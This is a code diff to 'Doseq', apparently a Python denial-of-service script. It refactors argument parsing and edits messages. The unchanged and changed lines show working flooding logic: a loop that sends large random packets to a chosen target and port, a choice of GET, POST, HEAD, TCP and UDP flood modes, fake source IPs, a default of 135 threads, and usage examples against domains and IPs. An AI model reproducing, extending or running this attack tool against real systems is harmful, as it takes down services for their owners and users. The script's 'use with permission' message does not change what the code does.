@@ -3348,6 +3348,8 @@ get_data = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=
 i = 1
 fake_ip = lambda: ".".join(str(random.randint(0, 255)) for _ in range(4))
 attacks = ["get","post","head","tcp","udp"]
+
+
 def syn_flood():
     global i
     while True:
@@ -3356,7 +3358,7 @@ def syn_flood():
             s.settimeout(5)
             s.connect((target,port))
             for _ in range(500):
-                s.send(random._urandom(65505))
+                s.send(random._urandom(65500))
                 i+=1
                 print("["+rd+"Flooding"+wi+f"]: (=>{target}:{port}<=) Packets sent :: ["+yl+f"{i}"+wi+"]", end='\r')
                 if isKilled(): break
@@ -3486,7 +3488,7 @@ def quit(sig,fream):
        time.sleep(2.5)
     print(wi+"\n["+gr+"*"+wi+"] Thanks For Using Doseq Script :)")
     if started:
-        print("["+gr+"*"+wi+"] I Hope You Use It With Permission"+yl+"!?"+wi)
+        print("["+gr+"*"+wi+"] I Hope You Used It With Permission"+yl+"!?"+wi)
     sys.exit(0)
 
 
@@ -3536,7 +3538,6 @@ Examples:
      | python3 doseq.py -s mydomain.com -p 443
      |--------
      | python3 doseq.py -s 192.168.0.22 -p 22 -t 500 -a tcp
--------------
 
 ''', add_help_option = False, version='Doseq version 1.0')
 parse.add_option('-s', '--server', '--target', type=str, dest='target')
@@ -3609,34 +3610,32 @@ if not any(opt for opt in opts):
     print("\n"+banner)
 else:
     if target:
-        if port:
+        if not port:
+            port = 80
+        else:
             if not port.isdigit() or not 0 <= int(port) <= 65535:
                 print(rd+"["+yl+"!"+rd+"]"+yl+" Error: Invalid Port Number Selected"+rd+" !!!")
                 sys.exit(1)
-            else:
-               port = int(port)
+            port = int(port)
+        if not threads:
+            threads = 135
         else:
-            port = 80
-        if threads:
-           if not threads.isdigit() or int(threads) <= 0:
+            if not threads.isdigit() or int(threads) <= 0:
                 print(rd+"["+yl+"!"+rd+"]"+yl+" Error: Invalid Threads Number Selected"+rd+" !!!"+wi)
                 sys.exit(1)
-           else:
-               threads = int(threads)
+            threads = int(threads)
+        if not attack:
+            attack = random.choice(attacks)
         else:
-            threads = 135
-        if attack:
             attack = attack.lower()
             if not attack in attacks:
                 print(rd+"["+yl+"!"+rd+"]"+yl+" Error: Invalid Attack Type Selected"+rd+" !!!"+wi)
                 sys.exit(1)
-        else:
-            attack = random.choice(attacks)
     elif help:
         print(parse.usage)
         sys.exit(0)
     else:
-       print(rd+"["+yl+"!"+rd+"]"+yl+" Error: Please Select Target First because it is Required"+rd+" !!!"+wi)
+       print(rd+"["+yl+"!"+rd+"]"+yl+" Error: Please Select The Target First because it is Required"+rd+" !!!"+wi)
        sys.exit(1)
 print(wi+"["+yl+"~"+wi+"] Check Internet Connection [...]", end='\r')
 time.sleep(2)
@@ -3658,6 +3657,7 @@ if not cnet(target,port):
     print("["+rd+"-"+wi+"] Check The Connection To The Target "+gr+f"{target}"+wi+":"+rd+f"{port}"+wi+" ["+rd+"Fail"+wi+"]\n", end='\r')
     print(rd+"  ["+yl+"!"+rd+"]"+yl+" Error: Unable to Connect to Target On "+rd+f"{target}"+yl+":"+rd+f"{port}"+yl+" !!!\n"+wi)
     sys.exit(1)
+
 print("["+gr+"+"+wi+"]"+wi+f" Check The Connection To The Target "+gr+f"{target}"+wi+":"+rd+f"{port}"+wi+" ["+gr+"Connected"+wi+"]\n", end='\r')
 print(wi+"["+yl+"~"+wi+"] Starting "+gr+f"{threads}"+wi+" Threads [...]", end='\r')
 THREADS = list()
@@ -3676,6 +3676,7 @@ time.sleep(1.5)
 
 threads = ((threads // 2) if not (threads % 2) else (threads + 1) // 2) if attack in ['get','post'] else threads
 started = True
+
 for _ in range(threads):
     if attack == 'get':
            t1 = threading.Thread(target=get_attack)
